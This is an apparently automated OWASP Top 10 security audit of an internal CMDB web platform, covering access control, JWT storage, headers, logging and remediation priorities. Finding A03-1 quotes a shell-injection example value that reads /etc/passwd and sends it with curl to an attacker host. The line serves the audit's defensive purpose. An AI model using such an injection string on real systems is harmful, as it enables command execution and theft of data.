# OWASP Top 10 (2021) Security Audit — CMDB Enterprise Platform v2.0.1

**Audit date:** 2026-04-17
**Auditor:** Automated security review (vibesec-skill)
**Scope:** Backend API (Express/Node.js `backend/src/index.ts`), Frontend (Next.js `frontend/`), nginx gateway (not present — see A05), PostgreSQL schema (`backend/prisma/schema.prisma`), Microsoft SSO (`backend/src/services/microsoftSso.ts`), LDAP (`backend/src/services/ldap.ts`)

---

## Executive Summary

The CMDB Enterprise Platform demonstrates a mature security posture for an enterprise internal tool: all database queries use parameterized Prisma tagged-template literals without string concatenation, JWT verification explicitly pins the algorithm to HS256, PKCE + server-side state/nonce prevents SSO CSRF and replay attacks, and file uploads validate magic bytes after the multer filter step. The most critical finding is an OS command injection vulnerability in `POST /api/admin/certificates/csr` (index.ts:1783) where user-supplied OpenSSL Subject fields (`cn`, `o`, `ou`, `c`, `st`) are interpolated without sanitization into a shell command string executed with `execAsync`. A secondary high-severity issue is that JWTs are stored in `localStorage` rather than `HttpOnly` cookies, exposing them to any XSS vector. The absence of a Content Security Policy header on the frontend is a compounding factor, and the backend port (3000) is exposed directly to the host in both compose files, bypassing the intended nginx gateway.

---

## Summary Table

| # | Category | Risk Level | Key Findings |
|---|----------|------------|--------------|
| A01 | Broken Access Control | **Medium** | VIEWER/AUDITOR can update vulnerability status; users list exposed to all roles |
| A02 | Cryptographic Failures | **Medium** | JWT in localStorage; SMTP may transmit credentials without TLS |
| A03 | Injection | **Critical** | OS command injection in CSR endpoint; LIKE wildcard injection partially mitigated |
| A04 | Insecure Design | **Medium** | Audit log purge cron can erase compliance records; no CSRF tokens for state mutations |
| A05 | Security Misconfiguration | **High** | Backend port exposed to host; no nginx CSP header; CSP disabled on API server; no rate limit per user |
| A06 | Vulnerable & Outdated Components | **Info** | Cannot verify dependency versions without package-lock scan; noted for follow-up |
| A07 | ID & Auth Failures | **Low** | Strong: bcrypt-12, MFA enforced for admins, account deactivation checked on every request |
| A08 | Software & Data Integrity Failures | **Low** | No SRI on frontend assets; SSO exchange code not bound to originating session |
| A09 | Security Logging & Monitoring Failures | **Medium** | Audit logs are deletable by cron; INFO logging disabled in prod suppresses useful signals |
| A10 | SSRF | **Low** | Greenbone/CrowdStrike endpoints accept arbitrary JSON bodies — no SSRF surface, but no hostname validation on EOL proxy |

---

## A01: Broken Access Control

**Description:** Controls that restrict what authenticated users can see or do are missing or insufficiently granular.

### Controls Implemented

- Three-tier RBAC (`ADMIN`, `AUDITOR`, `VIEWER`) is enforced via `requireAdmin` / `requireAudit` middleware applied per route (index.ts:279–294).
- All write endpoints (POST/PATCH/DELETE on CIs, contracts, licenses, documents, master data) require `requireAdmin` — correctly restricting writes to admins.
- `authenticateToken` performs a live DB check on every request to verify `users.active = true`, meaning deactivated accounts are rejected immediately without waiting for JWT expiry (index.ts:264–276).
- UUIDs used as primary keys throughout the schema prevent sequential ID enumeration.
- Password change enforces ownership: users can only change their own password (`/api/profile/change-password` uses `req.user!.id`, not a URL parameter).

### Findings

**Finding A01-1 — Medium | CVSS 5.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)**
`PATCH /api/vulnerabilities` (index.ts:1311) only requires `authenticateToken` — no `requireAdmin` guard. The comment in the startup log at line 4129 explicitly notes "any role". This means VIEWER and AUDITOR accounts can modify the lifecycle status of any vulnerability on any CI. For a CMDB that feeds into a security remediation workflow, this is an integrity violation — a VIEWER could mark CRITICAL vulnerabilities as RESUELTO without any admin approval.

*Recommendation:* Add `requireAdmin` (or at minimum a new `requireEditor` role) to `PATCH /api/vulnerabilities`. If auditors need write access, add `AUDITOR` as an allowed role explicitly and document the decision in the audit policy.

**Finding A01-2 — Low | CVSS 3.5**
`GET /api/users` (index.ts:880) is accessible to all authenticated roles and returns the full user list including `sso_external_id`, `mfa_enabled`, and `created_at`. VIEWER-role users can enumerate all system users with their Azure OIDs, which could aid targeted attacks. The `password` hash is correctly excluded, but `sso_external_id` leaks Azure Object IDs.

*Recommendation:* Restrict `GET /api/users` to `requireAdmin`, or filter the `sso_external_id` field from the response for non-admin callers.

**Finding A01-3 — Low | CVSS 3.1**
`DELETE /api/relations/:id` (index.ts:2520) deletes any CI relation by UUID without verifying that the requesting admin has any ownership or scoping relationship to the CIs involved. While RBAC is correctly checking for ADMIN role, in a multi-tenant future deployment this would become a horizontal privilege escalation vector. Currently low severity as all ADMINs share the same trust level.

*Recommendation:* Document that this endpoint assumes a single-tenant deployment. Add a comment and a future-TODO for tenant scoping.

---

## A02: Cryptographic Failures

**Description:** Sensitive data is exposed due to weak or absent cryptography, or secrets transmitted or stored insecurely.

### Controls Implemented

- bcrypt with cost factor 12 (`BCRYPT_ROUNDS`, index.ts:65) — meets OWASP recommendation of ≥12 rounds; configurable upward via env.
- JWT signed with HS256 using a server-side secret; algorithm is explicitly pinned at verification time (`{ algorithms: ['HS256'] }`, index.ts:247) preventing algorithm confusion attacks.
- JWT secret refuses to start in production if unset (index.ts:48–54) with a `process.exit(1)` guard.
- Password history stores hashed values using the same bcrypt rounds, never plaintext (index.ts:389–411).
- MFA TOTP secrets stored in DB (`mfa_secret`), never returned to the client after setup. The pending secret is stored server-side and never accepted from the client during the `/mfa/enable` flow (index.ts:1701–1705).
- SSO `exchangeCode` pattern avoids passing JWT in redirect URL parameters, preventing token leakage via Referer headers or browser history (index.ts:649–664).
- TLS certificates for the backend are mounted read-only in production (`tls-certs:/app/certs:ro,Z` — docker-compose.prod.yml:92).
- LDAP connections use `rejectUnauthorized` defaulting to `true`, only disabling for dev via `LDAP_TLS_REJECT_UNAUTHORIZED=0` (ldap.ts:42).

### Findings

**Finding A02-1 — High | CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)**
JWT tokens are stored in `localStorage` (`cmdb_token`, `cmdb_user`) — see `frontend/lib/apiFetch.ts:41` and `frontend/contexts/AuthContext.tsx:102`. `localStorage` is accessible to any JavaScript running on the page origin. If any XSS vulnerability exists (first-party or via a compromised third-party script), an attacker can exfiltrate the JWT and impersonate the user until token expiry (8h window). `HttpOnly` cookies are immune to this class of attack.

*Recommendation:* Move JWT storage to `HttpOnly; Secure; SameSite=Strict` cookies. This requires backend changes to `Set-Cookie` on login and read from cookie instead of `Authorization` header. If the SPA architecture makes cookie-based auth complex, implement token binding to `X-Requested-With` headers and enforce a strict CSP as compensating controls.

**Finding A02-2 — Medium | CVSS 5.9**
The SMTP configuration (`SMTP_SECURE`, `SMTP_PORT`) defaults to `false` / port 587 (docker-compose.prod.yml:65–66), which uses STARTTLS opportunistically. If the mail server does not advertise STARTTLS, Nodemailer may transmit credentials and EOL alert emails in cleartext. There is no enforcement of TLS verification on the SMTP transport.

*Recommendation:* Default `SMTP_SECURE=true` (port 465 implicit TLS) in the production compose. If STARTTLS on port 587 is intentional, configure `requireTLS: true` in the Nodemailer transport options to reject plain connections.

**Finding A02-3 — Low | CVSS 2.6**
The TOTP window is set to `window: 1` (index.ts:838, 1710), allowing ±30 seconds of clock skew on either side of the current time window. This is the OWASP-recommended setting and is not a vulnerability, but is noted for completeness.

---

## A03: Injection

**Description:** User-controlled data is sent to an interpreter without proper neutralization, allowing command or query injection.

### Controls Implemented

- All database queries use Prisma tagged-template literals (`$queryRaw\`...\``, `$executeRaw\`...\``) throughout the entire ~4,000 line backend — no string concatenation into SQL queries was observed. This is consistently applied including in the dynamic `whereClause` construction using `Prisma.sql` and `Prisma.join` for the audit log date filter (index.ts:1619–1624).
- LIKE queries in the Greenbone and CrowdStrike integration endpoints escape `%`, `_`, and `\` before interpolation, using the `ESCAPE '\\'` clause (index.ts:2608, 2717).
- LDAP injection is prevented via `escapeLdap()` (ldap.ts:54–71) applying RFC 4514/4515 escaping to all special characters before DN and filter construction.
- File uploads use UUID-based filenames, preventing path traversal via filename injection (index.ts:3000).
- Magic bytes validation happens after the multer filter, preventing MIME type confusion (index.ts:2983–2987).
- Document download enforces that the resolved file path stays within `DOCUMENTS_DIR` by constructing the path from a DB-stored UUID filename — no user-controlled path component (index.ts:3098).

### Findings

**Finding A03-1 — CRITICAL | CVSS 8.4 (CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)**
`POST /api/admin/certificates/csr` (index.ts:1780–1783) constructs an OpenSSL command string by directly interpolating user-supplied fields without sanitization:

```typescript
const subject = `/CN=${cn}${c ? `/C=${c}` : ''}${st ? `/ST=${st}` : ''}${o ? `/O=${o}` : ''}${ou ? `/OU=${ou}` : ''}`;
const cmd = `openssl req -new -newkey rsa:2048 -nodes -keyout "${keyPath}" -out "${csrPath}" -subj "${subject}"`;
const { stderr } = await execAsync(cmd);
```

A malicious admin-role user can inject shell metacharacters. For example, setting `cn` to `foo" -subj /CN=x && curl http://attacker.com/$(cat /etc/passwd) #` would execute arbitrary shell commands inside the backend container. Although this requires ADMIN role, insider threats or compromised admin accounts can escalate from application-level access to full container compromise. The container runs as a non-root user (noted in compose comments), but documents, certs, and DB credentials are accessible from within the container.

*Recommendation (immediate):* Replace `execAsync(cmd)` with the `child_process.execFile` API, which takes arguments as a separate array and prevents shell interpretation entirely:
```typescript
import { execFile } from 'child_process';
const { promisify } = await import('util');
const execFileAsync = promisify(execFile);
await execFileAsync('openssl', [
  'req', '-new', '-newkey', 'rsa:2048', '-nodes',
  '-keyout', keyPath, '-out', csrPath,
  '-subj', subject
]);
```
Additionally, validate each field against a strict allowlist regex (e.g., `/^[A-Za-z0-9 .,\-]+$/`) before building the subject string.

**Finding A03-2 — Low | CVSS 3.1**
`txt` and `csv` file types have no magic byte validation (`MAGIC_BYTES.txt = []`, index.ts:2791). Any file can be uploaded with a `.txt` or `.csv` extension by an admin, bypassing content validation. This is a narrow surface since download is forced as `application/octet-stream` unless the MIME type is in the `SAFE_INLINE_MIME_TYPES` allowlist, but a crafted CSV could contain formula injection for spreadsheet applications.

*Recommendation:* Accept the risk for `.txt` (no reliable magic bytes exist) and document the limitation. For `.csv`, consider rejecting uploads that begin with `=`, `+`, `-`, `@`, `\t`, or `\r` (CSV injection prefixes) when saving the file, or strip them.

---

## A04: Insecure Design

**Description:** Missing or ineffective security controls that should be part of the system's fundamental design.

### Controls Implemented

- MFA is mandatory for all ADMIN-role users — accounts without MFA receive a limited-scope JWT (`mfaSetupRequired: true`) that can only access `/api/auth/mfa/setup` and `/api/auth/mfa/enable` (index.ts:253–260).
- Server-side state store for SSO with 10-minute TTL and single-use state tokens prevents CSRF in the OAuth2 flow (index.ts:509, 552).
- One-time exchange code pattern prevents JWT from appearing in browser history or server logs (index.ts:655–664).
- Password policy with complexity requirements, common-password dictionary (300+ entries), history check (last 20), and minimum lengths differentiated by role (16 chars for ADMIN, 12 for others) (index.ts:357–387).
- AuditLog is described as insert-only in CLAUDE.md, with an ISO 27001 immutability requirement.

### Findings

**Finding A04-1 — Medium | CVSS 5.3**
The audit log purge cron (`0 3 * * *`) deletes records older than `AUDIT_RETENTION_DAYS` (default 365 days, index.ts:3539–3557). ISO 27001 Annex A.8.15 requires audit logs to be protected from unauthorized modification or deletion. The fact that the application itself can delete audit logs means a compromised backend process or a misconfigured `AUDIT_RETENTION_DAYS=0` would silently destroy the compliance audit trail. The default setting is not explicitly validated for a minimum retention floor.

*Recommendation:* Move audit log archival to an append-only external sink (syslog, AWS CloudWatch, Splunk) before deletion. At minimum, reject `AUDIT_RETENTION_DAYS < 90` at startup with a fatal error, and log a warning (even in production) when purge runs.

**Finding A04-2 — Medium | CVSS 4.3**
The application uses a SPA architecture where all API calls go through `Authorization: Bearer` headers, not cookies. This means there is no CSRF token mechanism. While Bearer token APIs are generally not vulnerable to classic CSRF (because cross-origin requests from an attacker's page cannot read `localStorage`), the combination with the lack of `SameSite` cookie restrictions and the suggestion that `credentials: true` is set in CORS config (index.ts:122) means that if tokens ever moved to cookies without proper `SameSite`, CSRF would become an immediate critical issue. The design creates fragility.

*Recommendation:* If migrating to `HttpOnly` cookies (see A02-1), implement the `SameSite=Strict` attribute. Document the current threat model explicitly, explaining why CSRF tokens are not needed for the current localStorage-based token design.

**Finding A04-3 — Low | CVSS 2.7**
The `PATCH /api/vulnerabilities` endpoint does not validate that the `ciId` in the request body actually belongs to a CI that the caller has access to. While all authenticated users can currently see all CIs (`GET /api/cis` has no ownership filter), the design lacks object-level authorization checks. Any authenticated user can update vulnerability status on any CI.

*Recommendation:* Combine with A01-1 fix — add `requireAdmin` to this endpoint.

---

## A05: Security Misconfiguration

**Description:** Default configurations, incomplete setups, unnecessary features enabled, or missing security hardening.

### Controls Implemented

- Helmet middleware applied at backend startup (index.ts:95–102) sets `X-Content-Type-Options`, `X-Frame-Options`, `X-XSS-Protection`, `Referrer-Policy`.
- HSTS configured with `maxAge: 31536000; includeSubDomains; preload` when `HTTPS_ENABLED=true` (index.ts:97–99).
- CORS is restricted to an explicit allowlist via `CORS_ORIGINS` environment variable (index.ts:105–122); wildcard origins are not permitted.
- PostgreSQL is not exposed to the host in the production compose (`cmdb-internal` network is `internal: true`, docker-compose.prod.yml:148).
- All containers use `security_opt: no-new-privileges:true` in production (docker-compose.prod.yml:45, 100, 131).
- No Adminer is included in the production compose.
- Rate limiting: login (10 req/15 min, skip successful), SSO (20 req/15 min), global API (300 req/min) (index.ts:129–188).
- Document download forces `Content-Disposition: attachment` for all non-safe MIME types (index.ts:3101–3103).

### Findings

**Finding A05-1 — High | CVSS 7.3**
In both `docker-compose.yml` (development) and `docker-compose.prod.yml` (production), the backend port is bound to the host:
- `docker-compose.yml:77`: `"${BACKEND_PORT:-3000}:3000"`
- `docker-compose.prod.yml:89`: `"${BACKEND_PORT:-3000}:3000"`

This means the Express API is directly reachable on port 3000 from the host (and potentially the network) without going through the nginx TLS gateway. An attacker on the same network can bypass nginx and hit the backend over plain HTTP, bypassing any nginx-level security headers, TLS, and IP-based ACLs. This directly contradicts the architecture description in CLAUDE.md which states "Only nginx exposes host ports."

*Recommendation:* Remove the `ports` stanza from the `backend` service in `docker-compose.prod.yml`. The backend only needs to be reachable on the `cmdb-public` Docker network by nginx, not by the host. In development, the direct exposure may be acceptable but should be documented as a dev-only configuration.

**Finding A05-2 — High | CVSS 6.1**
The nginx configuration file (`nginx/conf.d/frontend.conf`) is referenced in CLAUDE.md but does not exist in the repository (Glob search returned no `.conf` files). This means the nginx TLS gateway configuration — including any security headers it might set — is undocumented and potentially missing. Without an nginx configuration, there is no `Content-Security-Policy` header on the frontend origin, leaving the application fully exposed to XSS escalation via any injected script.

*Recommendation:* Add the nginx configuration to the repository. At minimum, the nginx config should set:
```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; frame-ancestors 'none'; base-uri 'self';" always;
add_header X-Frame-Options "DENY" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
```

**Finding A05-3 — Medium | CVSS 5.3**
`contentSecurityPolicy: false` is explicitly set in the Helmet configuration (index.ts:101). This means the Express backend does not send a `Content-Security-Policy` header. While the backend serves only JSON (no HTML), the lack of CSP allows any error page, health check endpoint, or future HTML-serving feature to run without a CSP. The health endpoint at `GET /health` returns JSON without any security headers.

*Recommendation:* Enable Helmet's CSP with an API-appropriate policy: `default-src 'none'; frame-ancestors 'none';`. This is safe for a JSON API and prevents any accidental HTML rendering from running scripts.

**Finding A05-4 — Medium | CVSS 4.3**
Rate limiting is IP-based only (via `express-rate-limit`). There is no per-user rate limiting. An attacker who controls many IP addresses (botnet, cloud instances) can bypass the IP-based login limiter. The login limiter uses `skipSuccessfulRequests: true` which is a good design choice to only count failed attempts, but there is no account lockout after N consecutive failures for a specific user email.

*Recommendation:* Add a per-email failed-login counter in Redis or the database. After 5 consecutive failures for the same email within 15 minutes, require a delay or out-of-band verification before accepting the next attempt. This is complementary to, not a replacement for, the IP-based rate limit.

**Finding A05-5 — Low | CVSS 2.6**
The development compose exposes Adminer on port 8080 (`docker-compose.yml:45`) with no authentication beyond what Adminer itself provides. Adminer has had CVEs in the past and provides direct DB access. This is a dev-only config but should be documented with a warning.

*Recommendation:* Add a comment explicitly warning that Adminer must never be exposed in production. Consider restricting Adminer to `127.0.0.1:8080` binding.

---

## A06: Vulnerable and Outdated Components

**Description:** Applications using components with known vulnerabilities are at risk.

### Controls Implemented

- Docker images pin specific versions: `postgres:16-alpine` (prod), `postgres:15-alpine` (dev). Application images are built from `Dockerfile`s which were not in scope for this audit.
- The CLAUDE.md references a stack upgrade changelog, suggesting version management is actively maintained.

### Findings

**Finding A06-1 — Info**
The `package.json` files for `backend/` and `frontend/` were not read in this audit. Known vulnerabilities in `jsonwebtoken`, `express`, `multer`, `next`, or `prisma` could be present. Key libraries of concern given the attack surface:
- `jsonwebtoken` — has had algorithm confusion CVEs in older versions.
- `multer` — file upload library with historical path traversal issues.
- `speakeasy` — TOTP library, not actively maintained upstream.
- `ldap-authentication` — uses `require()` dynamically (ldap.ts:32), suggesting it may be a pure-JS wrapper with its own dependency chain.

*Recommendation:* Run `npm audit` inside both `backend/` and `frontend/` containers. Integrate `npm audit --audit-level=high` into the CI/CD pipeline to gate deployments. Consider migrating from `speakeasy` (last published 2017) to `@otplib/preset-default` which is actively maintained.

---

## A07: Identification and Authentication Failures

**Description:** Weaknesses in authentication mechanisms allow attackers to compromise passwords, keys, or session tokens.

### Controls Implemented

- bcrypt cost factor 12 for all local password storage (index.ts:65).
- JWT algorithm explicitly pinned to `['HS256']` at verification, rejecting `alg: none` and RS/ES algorithm confusion (index.ts:247).
- JWT expiry is 8 hours for full tokens (index.ts:639, 791), 15 minutes for MFA setup tokens (index.ts:855). Expiry is checked client-side with a 30-second buffer to avoid sending expired tokens (apiFetch.ts:24–30), and the server verifies the `exp` claim via `jwt.verify`.
- Mandatory MFA for ADMIN role with TOTP (speakeasy) before receiving a full-scope JWT (index.ts:852–858).
- Non-admin users are prompted for MFA on first login via `MFA_SETUP_SUGGESTED` (index.ts:862–864).
- Trusted device tokens: 64 hex characters (32 random bytes), bound to IP address and User-Agent at creation time (index.ts:814–828), with configurable TTL (default 30 days).
- Password history check (last 20 by default) using bcrypt comparison, preventing reuse (index.ts:375–387).
- Accounts deactivated in DB are rejected on every request without waiting for JWT expiry (index.ts:264–276).
- LDAP passwords are never stored; a non-reusable dummy hash is stored for LDAP shadow users (index.ts:736).

### Findings

**Finding A07-1 — Low | CVSS 3.7**
Trusted device tokens are bound to `ip_address` and `user_agent` (index.ts:816–822), which is a good control. However, IP addresses are read from `req.ip` without verifying whether the Express app is correctly configured to trust the nginx proxy's `X-Forwarded-For` header. Without `app.set('trust proxy', 1)` (not observed in the code), `req.ip` will always be the Docker bridge IP of the nginx container, not the real client IP. This would make IP binding ineffective — all trusted device tokens would be bound to the same nginx container IP, meaning any user on any device could bypass MFA on a trusted device check if they know another user's device token.

*Recommendation:* Add `app.set('trust proxy', 1)` at the Express app initialization (or the appropriate number of proxy hops). Verify that `req.ip` reflects the real client IP in the nginx → backend forwarding path.

**Finding A07-2 — Low | CVSS 3.1**
The LDAP fallback behavior (index.ts:724–726) logs the LDAP failure and falls through to local authentication if LDAP is unavailable. This means if the LDAP server becomes temporarily unreachable (network partition, DoS), users fall back to local bcrypt authentication. For LDAP-managed users, this can be intentional, but for security-sensitive environments, it means an attacker who can disrupt LDAP connectivity can force fallback authentication. The LDAP shadow user has a random dummy hash that cannot be used for login, but the fallback behavior is not documented.

*Recommendation:* Document the intended fallback behavior explicitly. For high-security deployments, add a `LDAP_STRICT_MODE=true` option that disables local fallback for LDAP users.

**Finding A07-3 — Info**
The `AUTO_PROVISION` default in `microsoftSso.ts:31` is `true` (the condition is `!== 'false'`, so any value other than the string `'false'` provisions the user). In `docker-compose.prod.yml:86`, it defaults to `false`. The logic is correct but the default-true behavior in code is surprising and could auto-provision users if the env var is accidentally omitted.

*Recommendation:* Invert the default to `process.env.AZURE_AUTO_PROVISION === 'true'` (default false) for defense in depth. Update the compose default accordingly.

---

## A08: Software and Data Integrity Failures

**Description:** Code and infrastructure do not protect against integrity violations, including insecure deserialization and CI/CD pipeline attacks.

### Controls Implemented

- SSO ID tokens are validated with JWKS-fetched RSA public keys, explicit algorithm pinning (`['RS256']`), and claim validation (iss, aud, tid, nonce, email domain) (microsoftSso.ts:217–264).
- JWKS cache is invalidated and re-fetched on key rotation (microsoftSso.ts:89–98).
- Exchange code for SSO tokens is single-use and deleted immediately after redemption (index.ts:690).
- File upload magic byte validation prevents serving files with mismatched content type (index.ts:2795–2803).
- `Content-Disposition: attachment` forced for non-safe MIME types prevents stored XSS via uploaded files (index.ts:3101–3103).

### Findings

**Finding A08-1 — Medium | CVSS 5.4**
The SSO exchange code (index.ts:655–692) is stored in an in-memory `Map` and returned to the browser via a redirect URL query parameter. The code has a 2-minute TTL and is single-use. However, there is no binding between the exchange code and the browser session or IP that initiated the SSO flow. An attacker who can observe the redirect URL (e.g., via a shared log, shoulder surfing, Referer leak on a subsequent HTTP resource load) can exchange the code from a different browser or IP before the legitimate user does. The risk is reduced by the 2-minute window but not eliminated.

*Recommendation:* Bind the exchange code to the originating IP address at creation time (from the callback request) and validate it at exchange time. This provides defense in depth against out-of-band code theft.

**Finding A08-2 — Low | CVSS 3.1**
The Next.js frontend builds JavaScript bundles that are served without Subresource Integrity (SRI) hashes. If the static file hosting is compromised, or if a CDN is introduced in the future, tampered scripts could run in users' browsers.

*Recommendation:* For Next.js standalone deployments, SRI is not straightforwardly applicable to dynamically code-split bundles. Mitigate with a strict Content Security Policy using nonces (see A05-2) and ensure all static assets are served from the same origin as the application.

---

## A09: Security Logging and Monitoring Failures

**Description:** Insufficient logging, monitoring, or alerting allows attacks to go undetected or prevents forensic investigation.

### Controls Implemented

- Comprehensive `AuditLog` table tracking every write operation on CIs, relations, contracts, documents, users, licenses with `action`, `entity`, `entity_id`, `user_email`, and `created_at` (schema.prisma:416–428).
- Login events are logged to the audit table, including `LOGIN`, `LOGIN_SSO`, `MFA_ENABLED` (index.ts:782–785, 641–645).
- Password change events (`CHANGE_PASSWORD`, `RESET_PASSWORD`) are audited.
- Role changes (`SET_ROLE:<role>`) and account activation/deactivation are audited.
- Certificate upload is audited (`UPLOAD_CERTIFICATE`, index.ts:1843).
- Audit logs are queryable by date range for ADMIN and AUDITOR roles (index.ts:1596–1656).

### Findings

**Finding A09-1 — Medium | CVSS 5.3**
The audit log purge cron (index.ts:3536–3557) can delete records older than `AUDIT_RETENTION_DAYS`. The purge itself is NOT audited — there is no audit log entry recording when the purge ran, how many records were deleted, or by whom it was triggered. In a forensic investigation, an attacker who can influence the cron schedule or the retention variable can destroy evidence without leaving a trace in the audit system.

*Recommendation:* Insert an audit log entry for the purge operation itself (e.g., `action: 'AUDIT_PURGE', entity: 'SYSTEM', entity_id: 'audit-logs'`) before executing the DELETE. Additionally, write purge events to the application's standard output (which should be forwarded to an external SIEM) rather than only to the database.

**Finding A09-2 — Medium | CVSS 4.3**
The conditional logger `log.info` (index.ts:36–37) is disabled in production (`IS_DEV = APP_ENV === 'dev'`). This means security-relevant informational events — successful logins, LDAP authentication attempts, SSO user provisioning, bulk imports — are not written to application logs in production. Only `log.warn` and `log.error` persist. This makes real-time monitoring of authentication patterns impossible without querying the database audit table.

*Recommendation:* Move security-relevant events (login success/failure, user provisioning, privilege changes) to `log.warn` or a dedicated security logger that is always active. Use a structured logging library (e.g., `pino`) that makes log level configuration explicit per namespace. Consider always logging authentication events regardless of `APP_ENV`.

**Finding A09-3 — Low | CVSS 3.1**
Failed MFA attempts (`INVALID_MFA_CODE`, index.ts:840) and failed device token validations are not recorded in the `audit_logs` table. An attacker probing TOTP codes or brute-forcing device tokens would leave no forensic trace beyond the IP-based rate limit counter.

*Recommendation:* Insert `FAILED_MFA_ATTEMPT` and `FAILED_DEVICE_TOKEN` records into the audit log. This enables detection of TOTP brute-force attacks.

---

## A10: Server-Side Request Forgery (SSRF)

**Description:** The server makes outbound requests to URLs controlled by an attacker, potentially accessing internal services or cloud metadata.

### Controls Implemented

- The `FRONTEND_URL` in `microsoftSso.ts` is validated at startup to be a valid HTTP/HTTPS URL and normalized to its origin (scheme + host + port only), preventing path injection into the redirect URL (microsoftSso.ts:34–45).
- External API calls (JWKS, token exchange, EOL lookup) use hardcoded Microsoft/endoflife.date URLs, not user-controlled input.
- Greenbone and CrowdStrike integration endpoints accept JSON report data (not URLs) — there is no URL-fetching based on user input in these endpoints.
- The `POST /api/masters/sync-catalog` endpoint with `action: 'search'` constructs an EOL lookup slug from user input but only uses it in a path parameter to a hardcoded `endoflife.date` API URL (the slug is sanitized to `[a-z0-9-]` only, index.ts:1463).

### Findings

**Finding A10-1 — Low | CVSS 3.7**
The EOL service (`eolService.ts`, not read in full but called from index.ts:1154, 2235) makes outbound HTTP/HTTPS requests to `endoflife.date` API. The lookup slug is constructed from CI names, manufacturer names, and model names stored in the database. A malicious admin who creates a CI with a crafted name could potentially influence the API path sent to `endoflife.date`, but since the target domain is hardcoded, this is limited to influencing the path on that single external service, not SSRF to internal resources. Risk is low.

*Recommendation:* Verify that `eolService.ts` does not follow HTTP redirects that could redirect to internal addresses, and that the `endoflife.date` base URL is a hardcoded constant.

**Finding A10-2 — Info**
There is no SMTP relay functionality exposed as an API endpoint, no webhook/callback URL acceptance, and no user-provided URL fetching outside the SSO redirect URI (which is a hardcoded environment variable). The SSRF attack surface is therefore very limited. This is a positive design choice.

---

## Overall Risk Rating

**Overall: MEDIUM-HIGH**

The platform has a solid security foundation — parameterized queries are applied consistently and completely, the SSO implementation is cryptographically sound, MFA is enforced for privileged users, and the audit trail is comprehensive. The most significant risks are:

1. A critical OS command injection vulnerability in the CSR generation endpoint that requires immediate remediation regardless of the ADMIN-only access requirement.
2. JWT storage in `localStorage` combined with a missing Content Security Policy creates a viable XSS-to-session-hijack pathway.
3. The backend API port exposed to the host in production bypasses the nginx TLS gateway.

These three findings represent the difference between a well-secured application and one that can be fully compromised via a single exploitable condition.

---

## Priority Remediation List

1. **[CRITICAL] Fix OS command injection in `/api/admin/certificates/csr`** (A03-1, index.ts:1783)
   Replace `execAsync(cmd)` with `execFileAsync('openssl', [...args])` and add strict input validation on all Subject fields. Deploy immediately.

2. **[HIGH] Remove backend port exposure from `docker-compose.prod.yml`** (A05-1, line 89)
   Delete or comment out `ports: - "${BACKEND_PORT:-3000}:3000"` from the `backend` service. Backend should only be reachable via nginx on the internal Docker network.

3. **[HIGH] Add nginx configuration to repository with CSP headers** (A05-2)
   Create `nginx/conf.d/frontend.conf` with `Content-Security-Policy`, `X-Frame-Options`, and `HSTS` headers. This is a prerequisite for meaningful XSS protection.

4. **[HIGH] Migrate JWT from localStorage to HttpOnly cookies** (A02-1, apiFetch.ts:41, AuthContext.tsx:102)
   This eliminates the entire class of XSS-to-token-theft attacks. Requires coordinated backend and frontend changes.

5. **[MEDIUM] Restrict `PATCH /api/vulnerabilities` to ADMIN role** (A01-1, index.ts:1311)
   Add `requireAdmin` middleware. VIEWER and AUDITOR accounts should not be able to mutate vulnerability lifecycle status.

6. **[MEDIUM] Add per-email login rate limiting / account lockout** (A05-4)
   Complement the existing IP-based rate limiter with a per-email failed-attempt counter.

7. **[MEDIUM] Fix `app.set('trust proxy', 1)` for correct IP binding** (A07-1)
   Without this, trusted device token IP binding is ineffective in the nginx proxy topology.

8. **[MEDIUM] Audit the audit log purge cron** (A04-1, A09-1, index.ts:3539)
   Add a minimum retention floor (90 days), audit the purge event itself, and forward purge notifications to an external log sink.

9. **[MEDIUM] Log authentication events in production** (A09-2)
   Move login success, provisioning, and privilege-change events to always-active log level so they appear in container stdout.

10. **[LOW] Migrate from `speakeasy` to a maintained TOTP library** (A06-1)
    `speakeasy` has not been updated since 2017. Replace with `@otplib/preset-default` or `otpauth`.
